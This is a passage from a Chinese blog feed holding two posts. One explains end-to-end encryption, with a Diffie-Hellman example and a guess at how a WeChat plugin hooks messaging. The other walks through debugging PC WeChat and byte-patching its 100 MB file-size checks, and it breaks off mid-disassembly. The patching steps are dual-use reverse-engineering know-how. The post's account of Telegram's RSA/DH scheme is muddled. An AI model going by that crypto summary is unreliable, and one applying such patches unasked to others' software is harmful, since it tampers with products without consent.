<p>谁没个秘密呢，或者和朋友开个玩笑，或者和伴侣聊点”家常”，如果这些内容暴露在别人眼中，确实有点尴尬，但毕竟咱也没乱说啥吖…</p> <p>不过加密聊天也可有能会给某些人提供某些庇护，导致出现一些安全问题，这也是一个大问题…</p> <p>所以你让我说微信到底要不要、能不能看我们聊天内容，我确实也说不好…</p> <p>所以这里不讨论这种问题，我只聊技术。</p> <a id="more"></a> <h3 id="不是广告"><a href="#不是广告" class="headerlink" title="不是广告~~"></a>不是广告~~</h3><p>端对端加密（ end-to-end encryption），按我的简单理解就是A和B聊天，A说出去的话加密后，只有B能够解开密文，拿到明文，这个过程中网络传输过程全是加密的。</p> <blockquote> <p>2017年8月，WhatsApp宣布对所有通讯信息进行端到端加密，WhatsApp超过10亿用户的所有信息(包括文字、照片、视频、文件和语音信息)在默认下都会进行端到端加密，包括群聊。</p> <p>“我们的想法很简单：当你发送一条消息，只有接收你消息的人或群组可以读取，”WhatsApp创始人Jan Koum和Brian Acton表示，“没有人可以看到这些消息，网络罪犯、黑客、政府人员甚至我们都不能看到这些消息。端到端加密可确保WhatsApp通讯的隐私性，这有点像面对面的谈话。”</p> </blockquote> <p>看了这个新闻，知道我没理解错。</p> <p>其实我很早就写了个小工具，就实现了端对端加密，而且还是对聊天工具透明的，也就是说任何工具都能用。</p> <p>哈哈，有点吹了…</p> <p>小工具叫做<a href="https://anhkgg.com/Chisechat/" target="_blank" rel="noopener">Chisechat</a>，slogn是“独属于你和我的心灵密令”，本来是我自用的小玩意，后来改了几版之后才分享出来的。</p> <p>功能很简单，A和B都用Chisechat设置一个一样的密码（私下协商，打电话或者当面定好），A把要发的内容放到Chisechat加密，再用聊天工具把加密内容发给B，B拿到密文在Chisechat中解密查看。</p> <p>看起来操作是不是挺麻烦，其实还好，因为我针对操作做了优化，基本不影响聊天体验，具体不说了，感兴趣的自行下载试用，地址：<a href="https://anhkgg.com/Chisechat/" target="_blank" rel="noopener">https://anhkgg.com/Chisechat/</a>。</p> <p>唯一让我拿出来分享的原因是，我觉得自己做的挺好玩，让我啰嗦说道一下。</p> <p>Chisechat刚开始加密就是简单的xx算法+base64，然后base64的内容特征太明显，也不好看，我就开始想怎么弄得更自然一点，后来增加了两种模式。</p> <ol> <li>增加base64中文版算法，也就是那些xx字符全换成我选的一些中文，这样编码结果看起来自然多了</li> <li>后来觉得选的字太简单也不好看，就灵光一闪想到粤语。是的，粤语词看起来非常炫酷，非常好玩。</li> </ol> <p>具体如何你们自行鉴赏一下：</p> <p><img src="/img/chisechat.png" alt="img"></p> <p>OK，扯得有点多了，我的Chisechat其实一种粗糙且粗暴的一种解决方案，但够用了。</p> <h3 id="研究"><a href="#研究" class="headerlink" title="研究"></a>研究</h3><p>那WhatsApp是如何做的呢？不知道。</p> <p>但是搜索的时候，看到了这个必须拥有姓名的软件Telegram，也就是TgWechat参考的。</p> <p>Telegram中文名好像叫做“电报”，很安全的感觉。Telegram号称”这个世界上没人能监控我”。</p> <blockquote> <p>Telegram 为一对一的聊天提供端对端加密，加密模式是基于256位对称AES 加密，RSA 2048 的加密和Diffie-Hellman 的安全密钥交换协议。协议极其优秀，兼具数学和工程之美，不仅加密基础非常完善，在工程上也很出色，Telegram传递的消息为函数，可扩展性相当强。</p> </blockquote> <p>Telegram用的是RSA-dh+AES来完成的端对端加密。</p> <p>按我一个密码学渣的粗浅理解就是：</p> <ol> <li>A和B拥有相同的p、q，通过RSA生成各自公钥和私钥。</li> <li>私钥自行保存，公钥通过网络发送给对方。</li> <li>互相拿到公钥后，和自己的私钥一起算出一个共享密钥</li> <li>A和B算出密钥是一样的，这样就是可以互相AES加密解密了。</li> </ol> <p>具体算法大家自行查看其他<a href="https://blog.csdn.net/andylau00j/article/details/82178351" target="_blank" rel="noopener">更详细的分享</a>，比如对抗中间人攻击（RSA签名），爆破（p、q很大）。</p> <p>看一下这个实例更好理解：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//https://blog.csdn.net/andylau00j/article/details/82178351</span><br><span class="line"></span><br><span class="line">1.爱丽丝与鲍伯协定使用p=23以及g=5.</span><br><span class="line"> </span><br><span class="line">2.爱丽丝选择一个秘密整数a=6, 计算A = g^a mod p并发送给鲍伯。</span><br><span class="line">   A = 5^6 mod 23 = 8.</span><br><span class="line"> </span><br><span class="line">3.鲍伯选择一个秘密整数b=15, 计算B = g^b mod p并发送给爱丽丝。</span><br><span class="line">   B = 5^15 mod 23 = 19.</span><br><span class="line"> </span><br><span class="line">4.爱丽丝计算s = B a mod p</span><br><span class="line">  19^6 mod 23 = 2.</span><br><span class="line"> </span><br><span class="line">5.鲍伯计算s = A b mod p</span><br><span class="line">   8^15 mod 23 = 2.</span><br></pre></td></tr></table></figure> <p>总的来说，Telegram通过很牛逼的密钥交换算法让两方拥有了一样的密码，然后别人不知道，也找不到，这样子聊天内容一加密，就只有对方能够看到，如此完成了一个端对端加密的安全聊天通道。</p> <p>再扯一句，Telegram是通过协议和算法来完成协商密钥，而我的Chisechat是人工通过其他通道协商的密钥，殊途同归，嘎嘎。</p> <h3 id="猜测"><a href="#猜测" class="headerlink" title="猜测"></a>猜测</h3><p>理论搞明白了，现在想想TgWechat是怎么做的呢（这玩意加的vm太多了…别想逆了）？</p> <p>其实也有两种方式，一种类似于Chisechat的思路，自行设置密码，然后加密聊天，一种就是像Telegram一样通过协议和算法完成。</p> <p>这前面密码的事都没啥好说的，关键在Wechat不是你自己的软件，要怎么插入一些自己的东西进去。</p> <p>这里我也只是给出思路，猜测TgWechat是这么做的。</p> <ol> <li>hook sendmsg、recvmsg。</li> <li>密钥协商阶段，检查发送内容和接收内容是不是特定内容，是则通过算法生成公私钥，公钥sendmsg发送出去。</li> <li>recvmsg收到公钥，算出共享密钥。</li> <li>后续发送和接收到内容时，通过加密算法先加解密，再发送出去或者显示。</li> </ol> <p>OK，基本就是这样了。</p> <p>点击体验Chisechat：<a href="https://anhkgg.com/Chisechat/" target="_blank" rel="noopener">https://anhkgg.com/Chisechat/</a></p> <p>参考：</p> <ol> <li><a href="https://yq.aliyun.com/articles/194780" target="_blank" rel="noopener">WhatsApp宣布对所有通讯信息进行端到端加密</a></li> <li><a href="https://www.anquanke.com/post/id/102545" target="_blank" rel="noopener">全球没人能监控的聊天软件也要死了 — Telegram</a>。</li> <li><a href="https://blog.csdn.net/andylau00j/article/details/82178351" target="_blank" rel="noopener">DH秘钥交换算法</a></li> <li><a href="https://github.com/dplusec/tgwechat" target="_blank" rel="noopener">TgWechat</a></li> </ol> <p>欢迎关注技术公众号：<strong><span style="color:red">汉客儿</span></strong><br><img src="/img/wx.png" alt="img"></p> ]]></content>          <summary type="html">            &lt;h3 id=&quot;唠叨&quot;&gt;&lt;a href=&quot;#唠叨&quot; class=&quot;headerlink&quot; title=&quot;唠叨&quot;&gt;&lt;/a&gt;唠叨&lt;/h3&gt;&lt;p&gt;群里有人推了个项目&lt;a href=&quot;https://github.com/dplusec/tgwechat&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;TgWechat&lt;/a&gt;，微信端对端加密插件，还特意@了我表示感谢，受宠若惊。&lt;/p&gt; &lt;p&gt;隐私问题其实说了很久，有人说微信其实一直看着我们聊天，具体是怎么样的，咱也不知道，咱也不敢问吖…&lt;/p&gt; &lt;p&gt;谁没个秘密呢，或者和朋友开个玩笑，或者和伴侣聊点”家常”，如果这些内容暴露在别人眼中，确实有点尴尬，但毕竟咱也没乱说啥吖…&lt;/p&gt; &lt;p&gt;不过加密聊天也可有能会给某些人提供某些庇护，导致出现一些安全问题，这也是一个大问题…&lt;/p&gt; &lt;p&gt;所以你让我说微信到底要不要、能不能看我们聊天内容，我确实也说不好…&lt;/p&gt; &lt;p&gt;所以这里不讨论这种问题，我只聊技术。&lt;/p&gt;          </summary>                 <category term="security" scheme="https://anhkgg.github.io/tags/security/"/>            <category term="telegram" scheme="https://anhkgg.github.io/tags/telegram/"/>            <category term="wechat" scheme="https://anhkgg.github.io/tags/wechat/"/>        </entry>      <entry>     <title>教会微信：突破文件发送100M限制</title>     <link href="https://anhkgg.github.io/wechat-sendfile-100M/"/>     <id>https://anhkgg.github.io/wechat-sendfile-100M/</id>     <published>2019-08-16T04:12:27.000Z</published>     <updated>2019-08-16T04:15:41.023Z</updated>          <content type="html"><![CDATA[<p>9102年了，我想大部分人使用微信的频率应该都会高于QQ了吧。</p> <p>以前在QQ传文件的时候，哪里会想到会有文件大小限制，几G、几十G的文件随意传。</p> <p>而现在，用微信传文件，很尴尬，只能传100M或更小的文件。</p> <p>为什么做这个限制？我想可能是因为微信一开始就是手机应用。</p> <a id="more"></a> <ul> <li>最初手机存储空间并不像电脑那么大，所以微信可能认为手机存不下（而现在256G是标配了）。</li> <li>更重要的是，手机使用流量，大文件消耗流量更多，用户肯定受不了（现在流量也不贵了，再说还有WIFI呢）。</li> </ul> <p>所以限制文件大小，合情合理。</p> <p>但是，现在微信也出了PC版本了，也有很多用户在使用PC版本微信，还在限制100M就有点说不过去了。</p> <p>你说怕手机收到后下载耗流量，确实有点浪费，那你服务端可以区分一下嘛，用户也可以自己确认是否下载啊。</p> <p>但是，微信并没有做什么，这就很影响PC上微信的使用体验了。</p> <p>我要用微信传大文件啊（100M以上），因为我QQ密码忘了，因为我朋友QQ密码忘了…</p> <p>好，既然如此，你不做…还是…你不做，那就我来做！</p> <h3 id="1、突破本地100M限制"><a href="#1、突破本地100M限制" class="headerlink" title="1、突破本地100M限制"></a>1、突破本地100M限制</h3><p>下载最新的PC微信（当时2.6.8.65），开始分析微信对文件大小限制是如何做的，然后一一突破。</p> <p>在选择文件过程中就做了100M限制。</p> <p><img src="/img/wechat_100_1.png" alt="img"></p> <p>嗯，文件大小首先就想到了<code>GetFileSize</code>，下个断点看看。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">bp KERNEL32!GetFileSize</span><br><span class="line">bp KERNEL32!GetFileSizeEx</span><br><span class="line">0:000:x86&gt; kvn</span><br><span class="line"> # ChildEBP RetAddr  Args to Child              </span><br><span class="line">00 0075cf6c 7908f015 c78f272a 10977de0 00000001 KERNEL32!GetFileSizeEx</span><br><span class="line">01 0075cfec 7908ed8c 109a7218 0000001f 00000020 WeChatWin!IMVQQEngine::`default constructor closure&apos;+0x2f735</span><br><span class="line">0:000:x86&gt; g</span><br><span class="line">Breakpoint 2 hit</span><br><span class="line">KERNEL32!GetFileSizeEx:</span><br><span class="line">777840e0 ff25d80f7e77    jmp     dword ptr [KERNEL32!_imp__GetFileSizeEx (777e0fd8)] ds:002b:777e0fd8=&#123;KERNELBASE!GetFileSizeEx (76ce2ec0)&#125;</span><br><span class="line">0:000:x86&gt; kvn</span><br><span class="line"> # ChildEBP RetAddr  Args to Child              </span><br><span class="line">00 0075e810 7908fd9e c78f0396 00000000 0e61c3a4 KERNEL32!GetFileSizeEx</span><br><span class="line">01 0075eb50 792e5b5c 00000306 0000000f 00000000 WeChatWin!IMVQQEngine::`default constructor closure&apos;+0x304be</span><br><span class="line">0:000:x86&gt; g</span><br><span class="line">Breakpoint 2 hit</span><br><span class="line">KERNEL32!GetFileSizeEx:</span><br><span class="line">777840e0 ff25d80f7e77    jmp     dword ptr [KERNEL32!_imp__GetFileSizeEx (777e0fd8)] ds:002b:777e0fd8=&#123;KERNELBASE!GetFileSizeEx (76ce2ec0)&#125;</span><br><span class="line">0:008:x86&gt; kvn</span><br><span class="line"> # ChildEBP RetAddr  Args to Child              </span><br><span class="line">00 0378e530 79a9eba3 00000002 00000000 00000000 KERNEL32!GetFileSizeEx</span><br><span class="line">01 0378e5c4 79a9ee3d 00000002 00000000 00000000 WeChatWin!_ASSERT+0x553c3 //10aeeba3</span><br><span class="line">0:008:x86&gt; g</span><br></pre></td></tr></table></figure> <p>艾玛啊，触发有点多啊，头疼。算了，换个思路。点击发送文件按钮，会弹出文件选择对话框，这是微软提供的。</p> <p>写过win32 gui或者mfc程序的同学应该想到了，对弹出文件选择对话框的函数下断点。</p> <p>不是~bp shell32!SHBrowseForFolderW这是目录选择~，也不是~bp shell32!SHFileOperationW~，而是这个：<code>bp comdlg32!GetOpenFileNameW</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 5 hit</span><br><span class="line">COMDLG32!GetOpenFileNameW:</span><br><span class="line">7523e810 8bff            mov     edi,edi</span><br><span class="line">0:000:x86&gt; kvn</span><br><span class="line"> # ChildEBP RetAddr  Args to Child              </span><br><span class="line">00 0075cffc 7908eac2 0075d014 c78f0306 1097cb80 COMDLG32!GetOpenFileNameW (FPO: [1,1053,4])</span><br><span class="line">01 0075ebc0 7907e81c 000003e9 00000000 00000000 WeChatWin!IMVQQEngine::`default constructor closure&apos;+0x2f1e2 //100deac2</span><br><span class="line">02 0075ebd8 792e586f 000003e9 00000000 00000000 WeChatWin!IMVQQEngine::`default constructor closure&apos;+0x1ef3c</span><br><span class="line">03 0075ec38 792e556e c78f0492 00000000 0075ed54 WeChatWin!IMVQQEngine::`default constructor closure&apos;+0x285f8f</span><br><span class="line">04 0075ec54 753e48eb 00521896 000007e7 00000000 WeChatWin!IMVQQEngine::`default constructor closure&apos;+0x285c8e</span><br><span class="line">05 0075ec80 753c613c 792e54a0 00521896 000007e7 USER32!_InternalCallWinProc+0x2b</span><br><span class="line">06 0075ed64 753c528e 792e54a0 00000000 000007e7 USER32!UserCallWinProcCheckWow+0x3ac (FPO: [SEH])</span><br><span class="line">07 0075edd8 753c5070 000007e7 0075ee18 7968d71f USER32!DispatchMessageWorker+0x20e (FPO: [Non-Fpo])</span><br><span class="line">08 0075ede4 7968d71f 0075edfc 00000000 00d90000 USER32!DispatchMessageW+0x10 (FPO: [Non-Fpo])</span><br><span class="line">09 0075ee18 79666f9e 77779830 754207b0 00000001 WeChatWin!WCSGetInstance+0x2388f</span><br><span class="line">0a 0075f0a0 00d91918 00d90000 00a72bf2 00000000 WeChatWin!StartWachat+0x14e</span><br><span class="line">0b 0075f8bc 00d930b9 00d90000 00000000 00a72bf2 WeChat+0x1918</span><br><span class="line">0c 0075f908 77776359 00520000 77776340 0075f974 WeChat+0x30b9</span><br><span class="line">0d 0075f918 77a57a94 00520000 b5777c1c 00000000 KERNEL32!BaseThreadInitThunk+0x19 (FPO: [Non-Fpo])</span><br><span class="line">0e 0075f974 77a57a64 ffffffff 77a78e17 00000000 ntdll_779f0000!__RtlUserThreadStart+0x2f (FPO: [SEH])</span><br><span class="line">0f 0075f984 00000000 00d9312b 00520000 00000000 ntdll_779f0000!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])</span><br></pre></td></tr></table></figure> <p>根据返回地址<code>7908eac2</code>计算到在IDA中地址<code>100deac2</code>，用IDA翻看一下函数怎么做的。</p> <p>微信可以同时选择多个文件，这里循环获取到路径，限制最多10个，然后进入sub_100DEED0处理。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">v24 = -GetOpenFileNameW(&amp;v44);</span><br><span class="line">if ( *filename )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        memset(&amp;String1, 0, 0x208u);</span><br><span class="line">        lstrcatW(&amp;String1, (LPCWSTR)String);</span><br><span class="line">        lstrcatW(&amp;String1, filename);           // 构造完整路径</span><br><span class="line">        v46 = 0;</span><br><span class="line">        *(_OWORD *)sigle_filepath = 0i64;</span><br><span class="line">        sub_104822F0((int *)sigle_filepath, &amp;String1, 0xFFFFFFFF);</span><br><span class="line">        LOBYTE(v73) = 4;</span><br><span class="line">        sub_10056060((unsigned int *)&amp;filepath1, (unsigned int)sigle_filepath);</span><br><span class="line">        LOBYTE(v73) = 3;</span><br><span class="line">        if ( ++ii &gt; 10 )                        // 最多10个文件</span><br><span class="line">          break;</span><br><span class="line">        filename += lstrlenW(filename) + 1;     // 下一个文件</span><br><span class="line">        if ( !*filename )</span><br><span class="line">          goto LABEL_35;</span><br><span class="line">      &#125;</span><br><span class="line">...</span><br><span class="line">sub_104822F0((int *)&amp;filepath__, *filepath1_, 0xFFFFFFFF);</span><br><span class="line">sub_100DEED0((int)v61, v33, filepath__.buf, filepath__.len, (int)v41, v42, v43);</span><br></pre></td></tr></table></figure> <p>进入函数<code>sub_100DEED0</code>之后，一下就看到获取文件大小的函数，然后是判断文件是否大于100M。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    v16 = f_FileUtils::fileSize_10475050(&amp;path);</span><br><span class="line">    filesize = v16.LowPart;</span><br><span class="line"></span><br><span class="line">if ( filesize &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( filesize &gt;= 104857600 )              // 100M</span><br><span class="line">      &#123;</span><br><span class="line">         //100M提示框</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>先手工windbg修改一下指令，验证是否正确。把0x6400000改为0，jl改成jge即可。篇幅原因，不展开了。</p> <p>通过调试确认，100M以上文件绕过这个限制。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:100DF347 07C                 cmp     esi, 6400000h</span><br><span class="line">.text:100DF34D 07C                 jl      loc_100DF263 //0f8c10ffffff=&gt;0f8d10ffffff(jge)</span><br><span class="line">=&gt;</span><br><span class="line">.text:100DF347 07C                 cmp     esi, 0</span><br><span class="line">.text:100DF34D 07C                 jge      loc_100DF263 //0f8c10ffffff=&gt;0f8d10ffffff(jge)</span><br></pre></td></tr></table></figure> <p>但是还没完，依然会弹框，居然还有二次验证。</p> <p>调试函数<code>sub_100DEED0</code>，单步继续往下走，看看是哪里弹框。最终找到在<code>sub_10099D70</code>这个函数里还有校验。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v33 = sub_104FF8F0(v7 + 337);</span><br><span class="line">sub_10099D70((_BYTE *)v7[344], (size_t *)&amp;path, (char *)(v33 == 0));</span><br></pre></td></tr></table></figure> <p>同样进入<code>sub_10099D70</code>，找到校验代码。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v7 = f_FileUtils::fileSize_10475050(a2);</span><br><span class="line">  filesize = v7.LowPart;</span><br><span class="line">if ( filesize &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( filesize &gt; 104857600 )                 // 100M</span><br><span class="line">    &#123;</span><br><span class="line">        //100M提示框</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>windbg修改一下指令，验证是否正确。把0x6400000改为0，jle改成jge即可，调试确认绕过检查。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:1009A34C 0AC                 cmp     esi, 6400000h</span><br><span class="line">.text:1009A352 0AC                 jle     loc_1009A25C//0f8e04ffffff    =&gt;0f8d04ffffff(jge)</span><br><span class="line">=&gt;</span><br><span class="line">.text:1009A34C 0AC                 cmp     esi, 0</span><br><span class="line">.text:1009A352 0AC                 jge     loc_1009A25C//0f8e04ffffff    =&gt;0f8d04ffffff(jge)</span><br></pre></td></tr></table></figure> <p>过了这两处检查后，文件成功显示在输入框中。</p> <p><img src="/img/wechat_100_2.png" alt="img"></p> <p>不过直接发送依然失败，显示“上传文件大小不能大于100M”，应该是服务器做了检查。</p> <p><img src="/img/wechat_100_2_1.png" alt="img"></p> <p>另外，微信还支持拖动文件发送，经过前面两步的突破，此时拖入文件依然提示“发送的文件大小不能大于100M”。</p> <p>那继续把这个干掉吧。拖动文件首先想到的就是<code>DragQueryFileW</code>，加上断点试试。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bp shell32!DragQueryFileW</span><br><span class="line">0:000:x86&gt; kv</span><br><span class="line"> # ChildEBP RetAddr  Args to Child              </span><br><span class="line">00 004fdbec 790ce89a 0f1a3978 ffffffff 00000000 SHELL32!DragQueryFileW </span><br><span class="line">01 004fded8 7577104b 038ca6c0 0c6b0bf8 00000001 WeChatWin!IMVQQEngine::`default constructor closure&apos;+0x6efba//1011e89a 1011e8c9</span><br><span class="line">02 004fdf18 75e0f4c4 02fa7770 00000002 00180cd0 ole32!CPrivDragDrop::PrivDragDrop+0x2eb (FPO: [Non-Fpo]) (CONV: stdcall) [com\ole32\com\rot\getif.cxx @ 658] </span><br><span class="line">03 004fdf5c 75dd4f3d 75770d60 004fe178 0000000c RPCRT4!Invoke+0x34</span><br><span class="line"></span><br><span class="line">0:000:x86&gt; kv 4</span><br><span class="line"> # ChildEBP RetAddr  Args to Child              </span><br><span class="line">00 004fdbec 790ce8c9 0f1a3978 00000000 004fdcc0 SHELL32!DragQueryFileW (FPO: [Non-Fpo])</span><br><span class="line">01 004fded8 7577104b 038ca6c0 0c6b0bf8 00000001 WeChatWin!IMVQQEngine::`default constructor closure&apos;+0x6efe9//1011e8c9</span><br><span class="line">02 004fdf18 75e0f4c4 02fa7770 00000002 00180cd0 ole32!CPrivDragDrop::PrivDragDrop+0x2eb (FPO: [Non-Fpo]) (CONV: stdcall) [com\ole32\com\rot\getif.cxx @ 658] </span><br><span class="line">03 004fdf5c 75dd4f3d 75770d60 004fe178 0000000c RPCRT4!Invoke+0x34</span><br></pre></td></tr></table></figure> <p>确实拖动中会断下，但经过分析并不是关键代码，没有对文件进行处理，另外断下后，再跑起来，拖动文件失败。</p> <p>所以另想他法。又想到了前面没有用处的<code>getfilesizeex</code>,再来尝试一下。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:004&gt; bp kernel32!getfilesizeex</span><br><span class="line">0:004&gt; g</span><br><span class="line">Breakpoint 6 hit</span><br><span class="line">KERNEL32!GetFileSizeEx:</span><br><span class="line">777840e0 ff25d80f7e77    jmp     dword ptr [KERNEL32!_imp__GetFileSizeEx (777e0fd8)] ds:002b:777e0fd8=&#123;KERNELBASE!GetFileSizeEx (76ce2ec0)&#125;</span><br><span class="line">0:000:x86&gt; kv</span><br><span class="line"> # ChildEBP RetAddr  Args to Child              </span><br><span class="line">00 004fde4c 791a9fc6 c74c6e8e 00000001 038ca6c0 KERNEL32!GetFileSizeEx</span><br><span class="line">01 004fdec8 790cea71 0c700528 7a00c9dc 004fdf18 WeChatWin!IMVQQEngine::`default constructor closure&apos;+0x14a6e6 //101f9fc6</span><br><span class="line">02 004fded8 75770ed2 038ca6c0 0c700528 00000000 WeChatWin!IMVQQEngine::`default constructor closure&apos;+0x6f191</span><br><span class="line">03 004fdf18 75e0f4c4 02fa7770 00000002 00180cd0 ole32!CPrivDragDrop::PrivDragDrop+0x172 (FPO: [Non-Fpo])</span><br></pre></td></tr></table></figure> <p>嘿嘿，没想到一下子找到了关键位置，<code>getfilesizeex</code>建了一功。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">filesize = f_FileUtils::fileSize_10475050(v52);</span><br><span class="line"></span><br><span class="line">if ( sub_106DEFCB(*((_DWORD *)v2 + 463)) == 2 )</span><br><span class="line">&#123;</span><br><span class="line">  if ( filesize.QuadPart &gt; 0x1900000 )</span><br><span class="line">    goto LABEL_28;</span><br><span class="line">&#125;</span><br><span class="line">else if ( filesize.QuadPart &gt; 104857600 )</span><br><span class="line">&#123; </span><br><span class="line">     //100M提示</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <p>同样的方式，把0x6400000改为0，ja改成jbe，绕过这个校验。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:101FA196 078 81 7D C0 00 00 40 06                          cmp     dword ptr [ebp+filesize], 6400000h</span><br><span class="line">.text:101FA19D 078 0F 87 76 FE FF FF                             ja      loc_101FA019</span><br><span class="line">=&gt;</span><br><span class="line">.text:101FA196 078 81 7D C0 00 00 00 00                          cmp     dword ptr [ebp+filesize], 0</span><br><span class="line">.text:101FA19D 078 0F 86 76 FE FF FF                             jbe      loc_101FA019</span><br></pre></td></tr></table></figure> <p>OK，到这里，本地100M限制就成功突破，下面继续看看如何绕过服务器限制。</p> <h3 id="2、突破服务器100M限制"><a href="#2、突破服务器100M限制" class="headerlink" title="2、突破服务器100M限制"></a>2、突破服务器100M限制</h3><p>前面提到，能够选择大于100M文件之后，点击发送依然会失败，提示“上传文件大小不能大于100M”。</p> <p>很明显服务器做了上传文件限制。</p> <p>所以如何突破这个限制呢？</p> <p>额，动不了服务器代码啊…</p> <p>能够想到的就是在文件发送前，自动分割文件为小于100M的多个文件，然后将分割的文件自动发送出去，在接收方，把收到的每个文件再自动合并。</p> <p>如此服务器也不会说文件大于100M了，对于用户来说，体验也是一致的。</p> <p>是的，我就是这么实现的。</p> <p>首先，找到发送文件的函数。</p> <p>由于之前分享过如何找到发送消息的函数，详情请看文章<a href="https://mp.weixin.qq.com/s/uUXB9AHtnhCsD7gAfFYRoA" target="_blank" rel="noopener">微信PC端技术研究(3)-如何找到消息发送接口</a>，所以这里不详细分析如何找到发送文件的函数了。</p> <p>直接拿来用，就是这个函数<code>sub_102382E0</code>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:100CC124 DE0 83 EC 14                                      sub     esp, 14h</span><br><span class="line">.text:100CC127 DF4 8B CC                                         mov     ecx, esp        ; filepath</span><br><span class="line">.text:100CC129 DF4 89 65 A0                                      mov     [ebp-60h], esp</span><br><span class="line">.text:100CC12C DF4 57                                            push    edi             ; </span><br><span class="line">.text:100CC12D DF8 E8 FE 5E 3B 00                                call    sub_10482030</span><br><span class="line">.text:100CC132 DF4 83 EC 14                                      sub     esp, 14h</span><br><span class="line">.text:100CC135 E08 8B CC                                         mov     ecx, esp</span><br><span class="line">.text:100CC137 E08 89 65 9C                                      mov   